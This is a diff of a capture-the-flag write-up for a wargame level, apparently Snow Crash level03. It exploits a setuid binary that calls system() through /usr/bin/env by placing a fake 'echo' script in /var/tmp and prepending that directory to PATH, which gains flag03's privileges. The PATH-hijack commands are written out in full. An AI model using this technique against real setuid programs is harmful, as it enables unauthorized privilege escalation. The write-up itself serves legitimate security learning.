@@ -1,49 +1,68 @@
 ## Phase 1: Reconnaissance
 
-Initial investigation involved listing the directory contents with `ls -la`
+As with previous levels, the first step was to inspect the current directory and identify any unusual files
 
-An executable file was found that, when run, asks to be exploited
+- `ls -la` reveals an executable file named `level03`
 
-This indicates an exercise on reverse engineering and vulnerability exploitation
+Running the binary prints a message explicitly asking to be exploited, indicating that this level focuses on **binary analysis and exploitation**
 
 ---
 
-## Phase 2: Target Research on System
+## Phase 2: Binary Analysis
 
-I analyzed the file with the following command:
+We can learn more about with `file` command:
 
 ```bash
 file ./level03
 ```
 
-The output was:
+Output:
 
 ```txt
-./level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
+./level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, not stripped
 ```
 
-</br>
 
-Further investigation with the `strings` command revealed it's a C file, compiled with GNU C 4.6.3
->A search for vulnerable C functions (such as `strcpy`, `gets`, `scanf`, `sprintf`, `memcpy`) didn't reveal anything interesting
+Next, we use `strings` on the binary to get all readable human text:
 
-</br>
+```bash
+strings ./level03
+```
 
-I used `ltrace` to intercept `.dll` calls and found that the `system()` function is used to call a shell command (`/usr/bin/env echo Exploit me`) which might be exploitable
+This confirms the binary was compiled from C code (GNU C 4.6.3)  
+A search for common vulnerable functions (`strcpy`, `gets`, `scanf`, `sprintf`, `memcpy`) did **not** reveal anything exploitable
+
+
+---
+
+### Dynamic Analysis
+
+Using `ltrace`, library calls made by the program were observed:
 
 ```bash
 ltrace ./level03
 ```
-</br>
-I transfered the executable to my local machine and opened it with IDA Free disassembler
 
->The `main` function of the binary was examined:
+This revealed a call to:
+
+```c
+system("/usr/bin/env echo Exploit me");
+```
+
+This is a critical finding.
+
+---
+
+### Static Analysis
+
+- The binary was transferred to the local machine and opened in https://dogbolt.org
+- The `main` function was identified as:
 
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  int v4; // [esp+18h] [ebp-8h]
-  int v5; // [esp+1Ch] [ebp-4h]
+  int v4;
+  int v5;
 
   v4 = getegid();
   v5 = geteuid();
@@ -54,42 +73,57 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 ```
 
 
-- I found that the function `system("/usr/bin/env echo Exploit me")` searches for the first instance of the `echo` command in the directories listed in the `PATH` environment variable, therefore, creating a fake `echo` command could allow it to be executed instead of the system's `echo`
-
+- As we can see the program executes a system call `/usr/bin/env echo Exploit me`
+- This means the binary does **not** call `/bin/echo` directly, but instead executes the **first `echo` found in $PATH**, which can be manipulated
+- To exploit this, we need to add a directory of our own in $PATH and create a file that we call "echo" that will run our code
+- Now when the program runs `system("/usr/bin/env echo Exploit me");`, it will run our evil echo instead
+- This means we can run code with the privileges of flag03
 ---
 
 ## Phase 3: Exploitation
 
-Writable folders were searched for to start writing the fake `echo` script:
+To exploit this behavior, we need to find directories where we can write code:
 
 ```bash
 find / -type d -writable 2>/dev/null
 ```
 
-A simple test script was created to confirm the vunlnerability and added in `/var/tmp`:
+A writable directory (`/tmp`) was found. We used this to create a **fake `echo`**.
+
+### Proof of Concept
+
+A simple script was created to confirm code execution:
 
 ```bash
-echo "EXPLOITED"
-```
-
-The path of the script was added to the `PATH` environment variable and executable permission was granted:
-
-```bash
-export PATH=/var/tmp:$PATH
+echo "EXPLOITED" > /var/tmp/echo
 chmod +x /var/tmp/echo
 ```
 
-After running the binary again, it successfully prints "EXPLOITED", indicating successful arbitrary code execution
+The directory was then added to the beginning of the `PATH` variable:
 
-Adding the `whoami` command to the script printed `flag03`, confirming the exploit
+```bash
+export PATH=/var/tmp:$PATH
+```
 
----
-
-## Solved
-
-<details>
-        <summary>Click to reveal solution</summary>
-        Adding the getflag command to the fake echo script, obtain the token, and move to level04
-</details>  
+Running the binary again prints `EXPLOITED`, confirming that the fake `echo` was executed instead of the system one.
 
 ---
+
+### Privilege Confirmation
+
+- Replacing the script contents with:
+
+```bash
+whoami
+```
+
+- Printed:
+
+```
+flag03
+```
+
+- This confirms that the commands are executed with the **privileges of `flag03`**
+
+
+#### - We then replace `whoami` inside our echo script with `getflag` and successfully obtain the token and access to level04
